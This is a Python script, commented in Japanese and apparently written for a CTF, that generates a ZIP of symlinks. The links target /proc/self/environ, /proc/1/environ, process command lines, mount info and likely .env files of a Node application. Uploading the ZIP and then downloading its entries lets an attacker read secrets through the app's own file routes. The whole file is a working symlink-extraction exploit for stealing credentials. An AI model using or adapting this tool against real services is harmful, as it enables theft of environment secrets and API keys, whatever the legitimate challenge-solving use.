#!/usr/bin/env python3
"""
make_env_exfil_zip.py
- /proc/*/environ や .env など、Nodeプロセスの環境・周辺情報を読ませるための
  シンボリックリンク群を収録した ZIP を生成します。
- CTF用途（アップ→/files確認→/download/<name>で取得）
"""

from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
from datetime import datetime
import stat
import argparse
from pathlib import Path

# 取りたいファイルをここで定義
TARGETS = {
    # proc: 環境変数・起動引数・マウント情報など
    "self_environ": "/proc/self/environ",
    "pid1_environ": "/proc/1/environ",
    "self_cmdline": "/proc/self/cmdline",
    "pid1_cmdline": "/proc/1/cmdline",
    "mounts": "/proc/self/mountinfo",
    "status": "/proc/self/status",

    # OSヒント
    "os_release": "/etc/os-release",
    "hostname": "/etc/hostname",

    # .env 想定置き場
    "app_env": "/app/.env",
    "server.js": "/app/server.js",
    "usr_src_app_env": "/usr/src/app/.env",
    "home_node_env": "/home/node/.env",
}

def add_symlink(zf: ZipFile, name: str, target: str):
    zi = ZipInfo(name, date_time=datetime.now().timetuple()[:6])
    zi.create_system = 3  # Unix
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16  # symlink属性
    zi.compress_type = ZIP_DEFLATED
    # symlinkの「中身」にリンク先パス文字列を書き込むのが通例
    zf.writestr(zi, target.encode("utf-8"))

def build(output: Path):
    with ZipFile(output, "w") as z:
        z.writestr(
            "README.txt",
            "Upload to the app, then download each entry.\n"
            "Pretty-print environ files locally with: tr '\\0' '\\n' < file\n"
        )
        for name, target in TARGETS.items():
            add_symlink(z, name, target)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-o", "--output", default="env-exfil.zip",
                    help="output zip filename (default: env-exfil.zip)")
    args = ap.parse_args()
    build(Path(args.output))
    print(f"[+] wrote {args.output}")
